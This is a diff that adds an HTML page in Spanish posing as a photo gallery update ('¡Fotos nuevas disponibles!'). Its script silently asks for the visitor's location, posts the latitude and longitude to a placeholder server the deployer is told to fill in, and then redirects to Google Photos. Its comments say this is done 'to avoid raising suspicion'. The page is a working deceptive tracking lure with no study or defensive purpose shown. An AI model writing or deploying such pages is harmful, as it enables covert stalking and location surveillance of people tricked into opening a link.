@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>¡Fotos nuevas disponibles!</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { 
+            font-family: Arial, sans-serif; 
+            text-align: center; 
+            padding: 20px; 
+            background-color: #f5f5f5;
+        }
+        .loading { 
+            margin-top: 50px; 
+            color: #555; 
+        }
+    </style>
+</head>
+<body>
+    <h1>Actualizando galería...</h1>
+    <p>Espera un momento mientras cargamos el contenido.</p>
+    <div class="loading">Cargando...</div>
+
+    <script>
+        // Redirigir a Google Maps si se obtiene la ubicación
+        function sendLocation(position) {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            
+            // Opción 1: Enviar datos a un servidor tuyo (más discreto)
+            fetch("https://tudominio.vercel.app/api/log", {  // Cambia "tudominio" por tu nombre de proyecto
+                method: "POST",
+                body: JSON.stringify({ lat, lon }),
+                headers: { "Content-Type": "application/json" }
+            }).then(() => {
+                // Redirigir a un sitio legítimo para no levantar sospechas
+                window.location.href = "https://photos.google.com";
+            }).catch(() => {
+                window.location.href = "https://photos.google.com";
+            });
+
+            // Opción 2: Abrir Google Maps directamente (menos discreto)
+            // window.location.href = `https://www.google.com/maps?q=${lat},${lon}`;
+        }
+
+        // Intentar obtener la ubicación
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                sendLocation,
+                (error) => {
+                    // Si falla, redirigir igual a un sitio normal
+                    window.location.href = "https://photos.google.com";
+                },
+                { timeout: 5000 } // 5 segundos de espera
+            );
+        } else {
+            window.location.href = "https://photos.google.com";
+        }
+    </script>
+</body>
+</html>
